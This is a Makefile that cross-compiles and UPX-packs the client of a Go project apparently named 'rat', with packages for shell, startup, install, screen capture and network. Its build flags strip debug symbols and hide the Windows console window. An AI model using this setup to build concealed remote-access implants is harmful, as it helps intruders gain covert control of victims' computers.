GCFLAGS=-gcflags="-trimpath=$(GOPATH)\src"

BUILD=CGO_ENABLED=1 go build
LDFLAGS=-ldflags="-w -s"

DEFAULT=$(BUILD) $(GCFLAGS)
PROD=$(BUILD) $(GCFLAGS) $(LDFLAGS) --tags="prod"
PROD_WIN32=$(BUILD) $(GCFLAGS) -ldflags="-w -s -H windowsgui" --tags="prod"

UPX=-upx -9

ifdef SYSTEMROOT # windows
	EXT=.exe
else
	EXT=.bin
endif

windows:
	# windows x64
	GOOS=windows GOARCH=amd64 $(PROD_WIN32) -o bin/windows_amd64.exe
	$(UPX) bin/windows_amd64.exe

	# windows x86
	GOOS=windows GOARCH=386 $(PROD_WIN32) -o bin/windows_x86.exe
	$(UPX) bin/windows_x86.exe

macos:
	# client x64s
	GOOS=darwin GOARCH=amd64 $(PROD) -o bin/macos_amd64
	$(UPX) bin/macos_amd64

linux:
	# client x64
	GOOS=linux GOARCH=amd64 $(PROD) -o bin/linux_amd64
	$(UPX) bin/linux_amd64

	# client x86
	GOOS=linux GOARCH=386 $(PROD) -o bin/linux_x86
	$(UPX) bin/linux_x86

test:
	go test \
	rat/client/network \
	rat/client/crypto \
	rat/client \
	rat/client/computer \
	rat/client/drives \
	rat/client/install \
	rat/client/process \
	rat/client/shell \
	rat/client/startup \
	rat/client/screen \
	rat/client/windows

.PHONY: windows macos linux
